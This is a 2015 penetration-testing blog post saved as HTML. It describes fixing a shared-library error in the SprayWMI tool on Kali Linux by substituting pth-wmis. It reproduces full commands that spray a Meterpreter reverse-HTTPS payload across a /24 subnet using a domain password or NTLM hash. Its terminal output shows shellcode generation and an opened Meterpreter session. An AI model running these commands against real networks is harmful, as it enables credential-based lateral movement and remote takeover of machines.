<!DOCTYPE html>
<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]--><!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8"><![endif]--><!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9"><![endif]--><!--[if gt IE 8]><!--><html class="no-js">
<!--<![endif]--> <head> <meta charset="UTF-8"> <meta content="text/html; charset=UTF-8" http-equiv="Content-Type"> <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"> <title>Fixing wmis in SprayWMI â€“ popped.io</title> <meta name="description" content="A collection of my security research, random projects and attempts to amuse."> <meta name="keywords" content="SprayWMI, Kali, wmis, WMI, libgnutls.so.26"> <!-- Twitter Cards --> <meta name="twitter:card" content="summary"> <meta name="twitter:image" content="http://localhost:4000/assets/img/me.png"> <meta name="twitter:title" content="Fixing wmis in SprayWMI"> <meta name="twitter:description" content="I ran into an error with SprayWMI where wmis could not execute due issues with the system architecture, even though I am running an i386 version of Kali 2."> <meta name="twitter:site" content="@hackerjiv"> <meta name="twitter:creator" content="@hackerjiv"> <!-- Open Graph --> <meta property="og:locale" content="en_US"> <meta property="og:type" content="article"> <meta property="og:title" content="Fixing wmis in SprayWMI"> <meta property="og:description" content="I ran into an error with SprayWMI where wmis could not execute due issues with the system architecture, even though I am running an i386 version of Kali 2."> <meta property="og:url" content="http://localhost:4000/fixing-wmis-in-spraywmi/"> <meta property="og:site_name" content="popped.io"> <meta property="og:image" content="http://localhost:4000/assets/img/me.png"> <link rel="canonical" href="http://localhost:4000/fixing-wmis-in-spraywmi/"> <link href="http://localhost:4000/feed.xml" type="application/atom+xml" rel="alternate" title="popped.io Feed"> <!-- Handheld --> <meta name="HandheldFriendly" content="True"> <meta name="MobileOptimized" content="320"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- CSS --> <link rel="stylesheet" href="http://localhost:4000/assets/css/main.css"> <!-- JS --> <script src="http://localhost:4000/assets/js/modernizr-3.3.1.custom.min.js"></script> <!-- Favicons --> <link rel="apple-touch-icon" href="http://localhost:4000/assets/img/favicons/apple-icon-precomposed.png"> <link rel="apple-touch-icon" sizes="72x72" href="http://localhost:4000/assets/img/favicons/apple-icon-72x72.png"> <link rel="apple-touch-icon" sizes="114x114" href="http://localhost:4000/assets/img/favicons/apple-icon-114x114.png"> <link rel="apple-touch-icon" sizes="144x144" href="http://localhost:4000/assets/img/favicons/apple-icon-144x144.png"> <link rel="shortcut icon" type="image/png" href="http://localhost:4000/favicon.png"> <link rel="shortcut icon" href="http://localhost:4000/favicon.ico"> <!-- Background Image --> <style type="text/css">body {background-image:url(http://localhost:4000/assets/img/placeholder-big.jpg); background-repeat: no-repeat; background-size: cover; }</style> <!-- Post Feature Image --> <!-- Begin Jekyll SEO tag v2.2.3 --> <title>Fixing wmis in SprayWMI | popped.io</title> <meta property="og:title" content="Fixing wmis in SprayWMI"> <meta name="author" content="Sanjiv Kawa"> <meta property="og:locale" content="en_US"> <meta name="description" content="I ran into an error with SprayWMI where wmis could not execute due issues with the system architecture, even though I am running an i386 version of Kali 2."> <meta property="og:description" content="I ran into an error with SprayWMI where wmis could not execute due issues with the system architecture, even though I am running an i386 version of Kali 2."> <link rel="canonical" href="http://localhost:4000/fixing-wmis-in-spraywmi/"> <meta property="og:url" content="http://localhost:4000/fixing-wmis-in-spraywmi/"> <meta property="og:site_name" content="popped.io"> <meta property="og:type" content="article"> <meta property="article:published_time" content="2015-12-13T18:48:00-05:00"> <meta name="twitter:card" content="summary"> <meta name="twitter:site" content="@"> <meta name="twitter:creator" content="@Sanjiv Kawa"> <script type="application/ld+json"> {"@context":"http://schema.org","@type":"BlogPosting","headline":"Fixing wmis in SprayWMI","author":{"@type":"Person","name":"Sanjiv Kawa"},"datePublished":"2015-12-13T18:48:00-05:00","dateModified":"2015-12-13T18:48:00-05:00","description":"I ran into an error with SprayWMI where wmis could not execute due issues with the system architecture, even though I am running an i386 version of Kali 2.","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/img/me.png"},"name":"Sanjiv Kawa"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/fixing-wmis-in-spraywmi/"},"url":"http://localhost:4000/fixing-wmis-in-spraywmi/"}</script> <!-- End Jekyll SEO tag --> </head> <body> <nav id="dl-menu" class="dl-menuwrapper" role="navigation"> <button class="dl-trigger">Open Menu</button> <ul class="dl-menu"> <li><a href="http://localhost:4000/">Home</a></li> <li> <a href="#">About</a> <ul class="dl-submenu"> <li> <img src="http://localhost:4000/assets/img/me.png" alt="popped.io photo" class="author-photo"> <h4>popped.io</h4> <p>A collection of my security research, random projects and attempts to amuse.</p> </li> <li><a href="http://localhost:4000/about/"><span class="btn btn-inverse">Learn More</span></a></li> <li> <a href="mailto:sanjiv@popped.io" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-envelope-square"></i> Email</a> </li> <li> <a href="http://twitter.com/hackerjiv" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-twitter-square"></i> Twitter</a> </li> <li> <a href="http://linkedin.com/in/sanjivkawa" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-linkedin-square"></i> LinkedIn</a> </li> <li> <a href="http://github.com/skahwah" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-github"></i> Github</a> </li> </ul>
<!-- /.dl-submenu --> </li> <li> <a href="#">Posts</a> <ul class="dl-submenu"> <li><a href="http://localhost:4000/posts/">All Posts</a></li> <li><a href="http://localhost:4000/tags/">All Tags</a></li> </ul> </li> <li><a href="http://localhost:4000/projects/">Projects</a></li> </ul>
<!-- /.dl-menu --> </nav><!-- /.dl-menuwrapper --> <!-- Header --> <header class="header" role="banner"> <div class="wrapper animated fadeIn"> <div class="content"> <div class="post-title "> <h1>Fixing wmis in SprayWMI</h1> <h4>13 Dec 2015</h4> <p class="reading-time"> <i class="fa fa-clock-o"></i> Reading time ~4 minutes </p>
<!-- /.entry-reading-time --> <a class="btn zoombtn" href="http://localhost:4000/posts/"> <i class="fa fa-chevron-left"></i> </a> </div> <p>I ran into an error with SprayWMI where wmis could not execute due issues with the system architecture, even though I am running an i386 version of Kali 2.</p> <figure class="highlight"><pre><code class="language-css" data-lang="css"><span class="nt">root</span><span class="k">@kali</span><span class="p">:</span><span class="err">~</span><span class="p">/</span><span class="n">tools</span><span class="p">/</span><span class="n">spraywmi</span><span class="err">#</span> <span class="p">./</span><span class="n">spraywmi</span><span class="p">.</span><span class="n">py</span>

<span class="p">[</span><span class="err">!</span><span class="p">]</span> <span class="n">Unicorn</span> <span class="n">not</span> <span class="n">detected</span><span class="p">,</span> <span class="n">checking</span> <span class="n">out</span> <span class="n">for</span> <span class="n">you</span> <span class="n">automatically</span><span class="p">.</span>
<span class="n">Cloning</span> <span class="n">into</span> <span class="s2">'unicorn'</span><span class="p">...</span>
<span class="n">remote</span><span class="p">:</span> <span class="n">Counting</span> <span class="n">objects</span><span class="p">:</span> <span class="m">104</span><span class="p">,</span> <span class="n">done</span><span class="p">.</span>
<span class="n">remote</span><span class="p">:</span> <span class="n">Total</span> <span class="m">104</span> <span class="p">(</span><span class="n">delta</span> <span class="m">0</span><span class="p">),</span> <span class="n">reused</span> <span class="m">0</span> <span class="p">(</span><span class="n">delta</span> <span class="m">0</span><span class="p">),</span> <span class="n">pack-reused</span> <span class="m">104</span>
<span class="n">Receiving</span> <span class="n">objects</span><span class="p">:</span> <span class="m">100%</span> <span class="p">(</span><span class="m">104</span><span class="p">/</span><span class="m">104</span><span class="p">),</span> <span class="m">44.89</span> <span class="n">KiB</span> <span class="err">|</span> <span class="m">0</span> <span class="n">bytes</span><span class="p">/</span><span class="n">s</span><span class="p">,</span> <span class="n">done</span><span class="p">.</span>
<span class="n">Resolving</span> <span class="n">deltas</span><span class="p">:</span> <span class="m">100%</span> <span class="p">(</span><span class="m">60</span><span class="p">/</span><span class="m">60</span><span class="p">),</span> <span class="n">done</span><span class="p">.</span>
<span class="n">Checking</span> <span class="n">connectivity</span><span class="p">...</span> <span class="n">done</span><span class="p">.</span>
<span class="p">[</span><span class="err">!</span><span class="p">]</span> <span class="n">Looks</span> <span class="n">like</span> <span class="n">you</span> <span class="n">have</span> <span class="n">an</span> <span class="n">issue</span> <span class="n">with</span> <span class="n">wmis</span> <span class="n">-</span> <span class="n">this</span> <span class="n">is</span> <span class="n">most</span> <span class="n">likely</span> <span class="n">because</span> <span class="n">you</span> <span class="n">are</span> <span class="n">on</span> <span class="n">a</span> <span class="m">64</span> <span class="n">bit</span> <span class="n">platform</span> <span class="n">and</span> <span class="n">need</span> <span class="n">a</span> <span class="n">couple</span> <span class="n">things</span> <span class="n">first</span><span class="p">..</span>
<span class="p">[</span><span class="err">!</span><span class="p">]</span> <span class="n">If</span> <span class="n">on</span> <span class="n">Ubuntu</span> <span class="n">run</span> <span class="n">command</span> <span class="n">to</span> <span class="n">fix</span><span class="p">:</span> <span class="n">dpkg</span> <span class="n">--add-architecture</span> <span class="n">i386</span> <span class="err">&amp;&amp;</span> <span class="n">apt-get</span> <span class="n">update</span> <span class="err">&amp;&amp;</span> <span class="n">apt-get</span> <span class="n">install</span> <span class="n">libpam0g</span><span class="p">:</span><span class="n">i386</span> <span class="n">libpopt0</span><span class="p">:</span><span class="n">i386</span>
<span class="n">root</span><span class="err">@</span><span class="n">kali</span><span class="p">:</span><span class="err">~</span><span class="p">/</span><span class="n">tools</span><span class="p">/</span><span class="n">spraywmi</span><span class="err">#</span> <span class="p">./</span><span class="n">wmis</span>
<span class="p">./</span><span class="n">wmis</span><span class="p">:</span> <span class="n">error</span> <span class="n">while</span> <span class="n">loading</span> <span class="n">shared</span> <span class="n">libraries</span><span class="p">:</span> <span class="n">libgnutls</span><span class="p">.</span><span class="n">so</span><span class="m">.26</span><span class="p">:</span> <span class="n">cannot</span> <span class="n">open</span> <span class="n">shared</span> <span class="n">object</span> <span class="n">file</span><span class="p">:</span> <span class="n">No</span> <span class="n">such</span> <span class="n">file</span> <span class="n">or</span> <span class="n">directory</span></code></pre></figure> <p>I decided to try and locate libraries that contain libgnutls.</p> <figure class="highlight"><pre><code class="language-css" data-lang="css"><span class="nt">root</span><span class="k">@kali</span><span class="p">:</span><span class="err">~</span><span class="p">/</span><span class="n">tools</span><span class="p">/</span><span class="n">spraywmi</span><span class="err">#</span> <span class="n">apt-cache</span> <span class="n">search</span> <span class="n">libgnutls</span>
<span class="n">libgnutls-deb0-28</span> <span class="n">-</span> <span class="n">GNU</span> <span class="n">TLS</span> <span class="n">library</span> <span class="n">-</span> <span class="n">main</span> <span class="n">runtime</span> <span class="n">library</span>
<span class="n">libgnutls-openssl27</span> <span class="n">-</span> <span class="n">GNU</span> <span class="n">TLS</span> <span class="n">library</span> <span class="n">-</span> <span class="n">OpenSSL</span> <span class="n">wrapper</span>
<span class="n">libgnutls28-dbg</span> <span class="n">-</span> <span class="n">GNU</span> <span class="n">TLS</span> <span class="n">library</span> <span class="n">-</span> <span class="n">debugger</span> <span class="n">symbols</span>
<span class="n">libgnutls28-dev</span> <span class="n">-</span> <span class="n">GNU</span> <span class="n">TLS</span> <span class="n">library</span> <span class="n">-</span> <span class="n">development</span> <span class="n">files</span>
<span class="n">libgnutlsxx28</span> <span class="n">-</span> <span class="n">GNU</span> <span class="n">TLS</span> <span class="n">library</span> <span class="n">-</span> <span class="n">C</span><span class="err">++</span> <span class="n">runtime</span> <span class="n">library</span>
<span class="n">python-gnutls</span> <span class="n">-</span> <span class="n">Python</span> <span class="n">wrapper</span> <span class="n">for</span> <span class="n">the</span> <span class="n">GNUTLS</span> <span class="n">library</span>
<span class="n">root</span><span class="err">@</span><span class="n">kali</span><span class="p">:</span><span class="err">~</span><span class="p">/</span><span class="n">tools</span><span class="p">/</span><span class="n">spraywmi</span><span class="err">#</span></code></pre></figure> <p>Installing these libraries did not fix the issue. So I decided to find pth-wmis on my system and use this file instead of the wmis file provided with SprayWMI. The wmis file included with the SprayWMI package is used for invoking wmi queries. Therefore it should be the same as pth-wmis.</p> <figure class="highlight"><pre><code class="language-css" data-lang="css"><span class="nt">root</span><span class="k">@kali</span><span class="p">:</span><span class="err">~</span><span class="p">/</span><span class="n">tools</span><span class="p">/</span><span class="n">spraywmi</span><span class="err">#</span> <span class="n">updatedb</span>
<span class="n">root</span><span class="err">@</span><span class="n">kali</span><span class="p">:</span><span class="err">~</span><span class="p">/</span><span class="n">tools</span><span class="p">/</span><span class="n">spraywmi</span><span class="err">#</span> <span class="n">locate</span> <span class="n">wmis</span>
<span class="p">/</span><span class="n">root</span><span class="p">/</span><span class="n">tools</span><span class="p">/</span><span class="n">spraywmi</span><span class="p">/</span><span class="n">wmis</span>
<span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">pth-wmis</span>
<span class="n">root</span><span class="err">@</span><span class="n">kali</span><span class="p">:</span><span class="err">~</span><span class="p">/</span><span class="n">tools</span><span class="p">/</span><span class="n">spraywmi</span><span class="err">#</span> <span class="n">mv</span> <span class="n">wmis</span> <span class="n">wmis</span><span class="p">.</span><span class="n">orig</span>
<span class="n">root</span><span class="err">@</span><span class="n">kali</span><span class="p">:</span><span class="err">~</span><span class="p">/</span><span class="n">tools</span><span class="p">/</span><span class="n">spraywmi</span><span class="err">#</span> <span class="n">cp</span> <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">pth-wmis</span> <span class="p">./</span><span class="n">wmis</span>
<span class="n">root</span><span class="err">@</span><span class="n">kali</span><span class="p">:</span><span class="err">~</span><span class="p">/</span><span class="n">tools</span><span class="p">/</span><span class="n">spraywmi</span><span class="err">#</span> <span class="p">./</span><span class="n">spraywmi</span><span class="p">.</span><span class="n">py</span></code></pre></figure> <p>This got past the initial error of wmis being unable to locate libgnutls.</p> <figure class="highlight"><pre><code class="language-css" data-lang="css">  <span class="nt">__</span>   <span class="nt">__</span>   <span class="nt">__</span>                       
<span class="o">/</span><span class="nt">__</span><span class="err">`</span> <span class="o">|</span><span class="nt">__</span><span class="o">)</span> <span class="o">|</span><span class="nt">__</span><span class="o">)</span>  <span class="o">/</span><span class="err">\</span>  <span class="err">\</span> <span class="o">/</span> <span class="o">|</span>  <span class="o">|</span>  <span class="o">|</span><span class="err">\</span><span class="o">/|</span> <span class="o">|</span>
<span class="nc">.__</span><span class="o">/</span> <span class="o">|</span>    <span class="o">|</span>  <span class="err">\</span> <span class="o">/~~</span><span class="err">\</span>  <span class="o">|</span>  <span class="o">|/</span><span class="err">\</span><span class="o">|</span>  <span class="o">|</span>  <span class="o">|</span> <span class="o">|</span>


         <span class="nt">Written</span> <span class="nt">by</span><span class="o">:</span> <span class="nt">David</span> <span class="nt">Kennedy</span> <span class="o">@</span> <span class="nt">TrustedSec</span>


<span class="nt">SprayWMI</span> <span class="nt">is</span> <span class="nt">a</span> <span class="nt">method</span> <span class="nt">for</span> <span class="nt">mass</span> <span class="nt">spraying</span> <span class="nt">Unicorn</span> <span class="nt">PowerShell</span> <span class="nt">injection</span> <span class="nt">to</span> <span class="nt">CIDR</span> <span class="nt">notations</span><span class="o">.</span>

<span class="nt">Flags</span> <span class="nt">and</span> <span class="nt">descriptions</span><span class="o">:</span>

<span class="nt">domain</span>                 <span class="nt">Domain</span> <span class="nt">you</span> <span class="nt">are</span> <span class="nt">attacking</span><span class="o">.</span> <span class="nt">If</span> <span class="nt">its</span> <span class="nt">local</span><span class="o">,</span> <span class="nt">just</span> <span class="nt">specify</span> <span class="nt">workgroup</span><span class="o">.</span>
<span class="nt">username</span>               <span class="nt">Username</span> <span class="nt">to</span> <span class="nt">authenticate</span> <span class="nt">on</span> <span class="nt">the</span> <span class="nt">remote</span> <span class="nt">Windows</span> <span class="nt">system</span><span class="o">.</span>
<span class="nt">password</span>               <span class="nt">Password</span> <span class="nt">or</span> <span class="nt">password</span> <span class="nt">hash</span> <span class="nt">LM</span><span class="nd">:NTLM</span> <span class="nt">to</span> <span class="nt">use</span> <span class="nt">on</span> <span class="nt">the</span> <span class="nt">remote</span> <span class="nt">Windows</span> <span class="nt">system</span><span class="o">.</span>
<span class="nt">CIDR</span> <span class="nt">range</span> <span class="nt">or</span> <span class="nt">file</span>     <span class="nt">Specify</span> <span class="nt">a</span> <span class="nt">single</span> <span class="nt">IP</span><span class="o">,</span> <span class="nt">CIDR</span> <span class="nt">range</span> <span class="o">(</span><span class="nt">10</span><span class="nc">.0.1.1</span><span class="o">/</span><span class="nt">24</span><span class="o">)</span> <span class="nt">or</span> <span class="nt">multiple</span> <span class="nt">CIDRs</span><span class="o">:</span> <span class="nt">10</span><span class="nc">.0.1.1</span><span class="o">/</span><span class="nt">24</span><span class="o">,</span><span class="nt">10</span><span class="nc">.0.2.1</span><span class="o">/</span><span class="nt">24</span><span class="o">.</span>
                          <span class="nt">You</span> <span class="nt">can</span> <span class="nt">also</span> <span class="nt">specify</span> <span class="nt">a</span> <span class="nt">file</span> <span class="o">(</span><span class="nt">ex</span><span class="o">:</span> <span class="nt">ips</span><span class="nc">.txt</span><span class="o">)</span> <span class="nt">that</span> <span class="nt">contains</span> <span class="nt">a</span> <span class="nt">single</span> <span class="nt">IP</span> <span class="nt">addresses</span> <span class="nt">on</span> <span class="nt">each</span> <span class="nt">line</span><span class="o">.</span>
<span class="nt">payload</span>                <span class="nt">Metasploit</span> <span class="nt">payload</span><span class="o">,</span> <span class="nt">example</span><span class="o">:</span> <span class="nt">windows</span><span class="o">/</span><span class="nt">meterpreter</span><span class="o">/</span><span class="nt">reverse_tcp</span>
<span class="nt">LHOST</span>                  <span class="nt">Reverse</span> <span class="nt">shell</span> <span class="nt">IP</span> <span class="nt">address</span><span class="o">.</span>
<span class="nt">LPORT</span>                  <span class="nt">Reverse</span> <span class="nt">shell</span> <span class="nt">listening</span> <span class="nt">port</span><span class="o">.</span>
<span class="nt">optional</span><span class="o">:</span> <span class="nt">NO</span>           <span class="nt">Specify</span> <span class="nt">no</span> <span class="nt">if</span> <span class="nt">you</span> <span class="nt">do</span> <span class="nt">not</span> <span class="nt">want</span> <span class="nt">to</span> <span class="nt">create</span> <span class="nt">a</span> <span class="nt">listener</span><span class="o">.</span> <span class="nt">This</span> <span class="nt">is</span> <span class="nt">useful</span> <span class="nt">if</span> <span class="nt">you</span> <span class="nt">already</span> <span class="nt">have</span> <span class="nt">a</span> <span class="nt">listener</span>
                          <span class="nt">established</span><span class="o">.</span> <span class="nt">If</span> <span class="nt">you</span> <span class="nt">do</span> <span class="nt">not</span> <span class="nt">specify</span> <span class="nt">a</span> <span class="nt">value</span><span class="o">,</span> <span class="nt">it</span> <span class="nt">will</span> <span class="nt">automatically</span> <span class="nt">create</span> <span class="nt">a</span> <span class="nt">listener</span> <span class="nt">for</span> <span class="nt">you</span><span class="o">.</span>      </code></pre></figure> <p>Testing SprayWMI with the recently replaced wmis file proved to be the solution for my issue. One thing to note is that you will need to escape certain characters otherwise SprayWMI will hang at <code class="highlighter-rouge">[*] Be patient, Metasploit takes a little bit to start.</code></p> <figure class="highlight"><pre><code class="language-css" data-lang="css"><span class="nt">root</span><span class="k">@kali</span><span class="p">:</span><span class="err">~</span><span class="p">/</span><span class="n">tools</span><span class="p">/</span><span class="n">spraywmi</span><span class="err">#</span> <span class="n">python</span> <span class="n">spraywmi</span><span class="p">.</span><span class="n">py</span> <span class="n">popped</span> <span class="n">spock</span> <span class="n">XXXXXXXX</span><span class="err">\!</span><span class="n">X</span> <span class="m">192.168.1.0</span><span class="p">/</span><span class="m">24</span> <span class="n">windows</span><span class="p">/</span><span class="n">meterpreter</span><span class="p">/</span><span class="n">reverse_https</span> <span class="m">192.168.1.193</span> <span class="m">443</span>

<span class="p">[</span><span class="err">*</span><span class="p">]</span> <span class="n">Launching</span> <span class="n">SprayWMI</span> <span class="n">on</span> <span class="n">the</span> <span class="n">hosts</span> <span class="n">specified</span><span class="p">.</span>
<span class="p">[</span><span class="err">*</span><span class="p">]</span> <span class="n">Generating</span> <span class="n">shellcode</span> <span class="n">through</span> <span class="n">Unicorn</span><span class="p">,</span> <span class="n">this</span> <span class="n">could</span> <span class="n">take</span> <span class="n">a</span> <span class="n">few</span> <span class="n">seconds</span><span class="p">.</span>
<span class="p">[</span><span class="err">*</span><span class="p">]</span> <span class="n">Launching</span> <span class="n">the</span> <span class="n">listener</span> <span class="n">in</span> <span class="n">the</span> <span class="n">background</span><span class="p">.</span>
<span class="p">[</span><span class="err">*</span><span class="p">]</span> <span class="n">Waiting</span> <span class="n">for</span> <span class="n">the</span> <span class="n">listener</span> <span class="n">to</span> <span class="n">start</span> <span class="n">first</span> <span class="n">before</span> <span class="n">we</span> <span class="n">continue</span><span class="p">.</span>
<span class="p">[</span><span class="err">*</span><span class="p">]</span> <span class="n">Be</span> <span class="n">patient</span><span class="p">,</span> <span class="n">Metasploit</span> <span class="n">takes</span> <span class="n">a</span> <span class="n">little</span> <span class="n">bit</span> <span class="n">to</span> <span class="n">start</span><span class="p">.</span>
<span class="p">[</span><span class="err">*</span><span class="p">]</span> <span class="n">Sweeping</span> <span class="n">targets</span> <span class="n">for</span> <span class="n">open</span> <span class="n">TCP</span> <span class="n">port</span> <span class="m">135</span> <span class="n">first</span><span class="p">,</span> <span class="n">then</span> <span class="n">moving</span> <span class="n">through</span><span class="p">.</span> <span class="n">Be</span> <span class="n">patient</span><span class="p">.</span>
<span class="p">[</span><span class="err">*</span><span class="p">]</span> <span class="n">Launching</span> <span class="n">WMI</span> <span class="n">spray</span> <span class="n">against</span> <span class="n">IP</span><span class="p">:</span> <span class="m">192.168.1.86</span> <span class="n">-</span> <span class="n">You</span> <span class="n">should</span> <span class="n">have</span> <span class="n">a</span> <span class="n">shell</span> <span class="n">in</span> <span class="n">the</span> <span class="n">background</span><span class="p">.</span> <span class="n">Once</span> <span class="n">finished</span><span class="p">,</span> <span class="n">a</span> <span class="n">shell</span> <span class="n">will</span> <span class="n">spawn</span><span class="p">.</span>
<span class="p">[</span><span class="err">*</span><span class="p">]</span> <span class="n">Spraying</span> <span class="n">is</span> <span class="n">still</span> <span class="n">happening</span> <span class="n">in</span> <span class="n">the</span> <span class="n">background</span><span class="p">,</span> <span class="n">shells</span> <span class="n">should</span> <span class="n">arrive</span> <span class="n">as</span> <span class="n">they</span> <span class="n">complete</span><span class="p">.</span>
<span class="p">[</span><span class="err">*</span><span class="p">]</span> <span class="n">Interacting</span> <span class="n">with</span> <span class="n">Metasploit</span><span class="p">.</span>
 <span class="n">as</span> <span class="n">background</span> <span class="n">job</span><span class="p">.</span>

<span class="p">[</span><span class="err">*</span><span class="p">]</span> <span class="n">Started</span> <span class="n">HTTPS</span> <span class="n">reverse</span> <span class="n">handler</span> <span class="n">on</span> <span class="n">https</span><span class="p">://</span><span class="m">0.0.0.0</span><span class="p">:</span><span class="m">443</span><span class="p">/</span>
<span class="p">[</span><span class="err">*</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">the</span> <span class="n">payload</span> <span class="n">handler</span><span class="p">...</span>
<span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">handler</span><span class="p">)</span> <span class="err">&gt;</span> <span class="p">[</span><span class="err">*</span><span class="p">]</span> <span class="m">192.168.1.86</span><span class="p">:</span><span class="m">49223</span> <span class="p">(</span><span class="n">UUID</span><span class="p">:</span> <span class="m">269</span><span class="n">d2a51d09e214e</span><span class="p">/</span><span class="n">x86</span><span class="err">=</span><span class="m">1</span><span class="p">/</span><span class="n">windows</span><span class="err">=</span><span class="m">1</span><span class="p">/</span><span class="m">2015-12-13</span><span class="n">T23</span><span class="p">:</span><span class="m">18</span><span class="p">:</span><span class="m">44</span><span class="n">Z</span><span class="p">)</span> <span class="n">Staging</span> <span class="n">Native</span> <span class="n">payload</span> <span class="p">...</span>
<span class="p">[</span><span class="err">*</span><span class="p">]</span> <span class="n">Encoded</span> <span class="n">stage</span> <span class="n">with</span> <span class="n">x86</span><span class="p">/</span><span class="n">shikata_ga_nai</span>
<span class="p">[</span><span class="err">*</span><span class="p">]</span> <span class="n">Meterpreter</span> <span class="n">session</span> <span class="m">1</span> <span class="n">opened</span> <span class="p">(</span><span class="m">192.168.1.193</span><span class="p">:</span><span class="m">443</span> <span class="n">-</span><span class="err">&gt;</span> <span class="m">192.168.1.86</span><span class="p">:</span><span class="m">49223</span><span class="p">)</span> <span class="n">at</span> <span class="m">2015-12-13</span> <span class="m">16</span><span class="p">:</span><span class="m">18</span><span class="p">:</span><span class="m">50</span> <span class="m">-0700</span></code></pre></figure> <p>Tested with a hash to confirm that SprayWMI is able to use wmis in its intended way.</p> <figure class="highlight"><pre><code class="language-css" data-lang="css"><span class="nt">root</span><span class="k">@kali</span><span class="p">:</span><span class="err">~</span><span class="p">/</span><span class="n">tools</span><span class="p">/</span><span class="n">spraywmi</span><span class="err">#</span> <span class="n">python</span> <span class="n">spraywmi</span><span class="p">.</span><span class="n">py</span> <span class="n">popped</span> <span class="n">spock</span> <span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="m">6</span><span class="n">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX5</span> <span class="m">192.168.1.0</span><span class="p">/</span><span class="m">24</span> <span class="n">windows</span><span class="p">/</span><span class="n">meterpreter</span><span class="p">/</span><span class="n">reverse_https</span> <span class="m">192.168.1.193</span> <span class="m">443</span>

<span class="p">[</span><span class="err">*</span><span class="p">]</span> <span class="n">Launching</span> <span class="n">SprayWMI</span> <span class="n">on</span> <span class="n">the</span> <span class="n">hosts</span> <span class="n">specified</span><span class="p">.</span>
<span class="p">[</span><span class="err">*</span><span class="p">]</span> <span class="n">Generating</span> <span class="n">shellcode</span> <span class="n">through</span> <span class="n">Unicorn</span><span class="p">,</span> <span class="n">this</span> <span class="n">could</span> <span class="n">take</span> <span class="n">a</span> <span class="n">few</span> <span class="n">seconds</span><span class="p">.</span>
<span class="p">[</span><span class="err">*</span><span class="p">]</span> <span class="n">Launching</span> <span class="n">the</span> <span class="n">listener</span> <span class="n">in</span> <span class="n">the</span> <span class="n">background</span><span class="p">.</span>
<span class="p">[</span><span class="err">*</span><span class="p">]</span> <span class="n">Waiting</span> <span class="n">for</span> <span class="n">the</span> <span class="n">listener</span> <span class="n">to</span> <span class="n">start</span> <span class="n">first</span> <span class="n">before</span> <span class="n">we</span> <span class="n">continue</span><span class="p">.</span>
<span class="p">[</span><span class="err">*</span><span class="p">]</span> <span class="n">Be</span> <span class="n">patient</span><span class="p">,</span> <span class="n">Metasploit</span> <span class="n">takes</span> <span class="n">a</span> <span class="n">little</span> <span class="n">bit</span> <span class="n">to</span> <span class="n">start</span><span class="p">.</span>
<span class="p">[</span><span class="err">*</span><span class="p">]</span> <span class="n">Sweeping</span> <span class="n">targets</span> <span class="n">for</span> <span class="n">open</span> <span class="n">TCP</span> <span class="n">port</span> <span class="m">135</span> <span class="n">first</span><span class="p">,</span> <span class="n">then</span> <span class="n">moving</span> <span class="n">through</span><span class="p">.</span> <span class="n">Be</span> <span class="n">patient</span><span class="p">.</span>
<span class="p">[</span><span class="err">*</span><span class="p">]</span> <span class="n">Launching</span> <span class="n">WMI</span> <span class="n">spray</span> <span class="n">against</span> <span class="n">IP</span><span class="p">:</span> <span class="m">192.168.1.86</span> <span class="n">-</span> <span class="n">You</span> <span class="n">should</span> <span class="n">have</span> <span class="n">a</span> <span class="n">shell</span> <span class="n">in</span> <span class="n">the</span> <span class="n">background</span><span class="p">.</span> <span class="n">Once</span> <span class="n">finished</span><span class="p">,</span> <span class="n">a</span> <span class="n">shell</span> <span class="n">will</span> <span class="n">spawn</span><span class="p">.</span>
<span class="p">[</span><span class="err">*</span><span class="p">]</span> <span class="n">Spraying</span> <span class="n">is</span> <span class="n">still</span> <span class="n">happening</span> <span class="n">in</span> <span class="n">the</span> <span class="n">background</span><span class="p">,</span> <span class="n">shells</span> <span class="n">should</span> <span class="n">arrive</span> <span class="n">as</span> <span class="n">they</span> <span class="n">complete</span><span class="p">.</span>
<span class="p">[</span><span class="err">*</span><span class="p">]</span> <span class="n">Interacting</span> <span class="n">with</span> <span class="n">Metasploit</span><span class="p">.</span>
 <span class="n">as</span> <span class="n">background</span> <span class="n">job</span><span class="p">.</span>

<span class="p">[</span><span class="err">*</span><span class="p">]</span> <span class="n">Started</span> <span class="n">HTTPS</span> <span class="n">reverse</span> <span class="n">handler</span> <span class="n">on</span> <span class="n">https</span><span class="p">://</span><span class="m">0.0.0.0</span><span class="p">:</span><span class="m">443</span><span class="p">/</span>
<span class="p">[</span><span class="err">*</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">the</span> <span class="n">payload</span> <span class="n">handler</span><span class="p">...</span>
<span class="n">msf</span> <span class="n">exploit</span><span class="p">(</span><span class="n">handler</span><span class="p">)</span> <span class="err">&gt;</span> <span class="p">[</span><span class="err">*</span><span class="p">]</span> <span class="m">192.168.1.86</span><span class="p">:</span><span class="m">58170</span> <span class="p">(</span><span class="n">UUID</span><span class="p">:</span> <span class="n">a11ee6c27b6cc418</span><span class="p">/</span><span class="n">x86</span><span class="err">=</span><span class="m">1</span><span class="p">/</span><span class="n">windows</span><span class="err">=</span><span class="m">1</span><span class="p">/</span><span class="m">2015-12-13</span><span class="n">T23</span><span class="p">:</span><span class="m">20</span><span class="p">:</span><span class="m">52</span><span class="n">Z</span><span class="p">)</span> <span class="n">Staging</span> <span class="n">Native</span> <span class="n">payload</span> <span class="p">...</span>
<span class="p">[</span><span class="err">*</span><span class="p">]</span> <span class="n">Encoded</span> <span class="n">stage</span> <span class="n">with</span> <span class="n">x86</span><span class="p">/</span><span class="n">shikata_ga_nai</span>
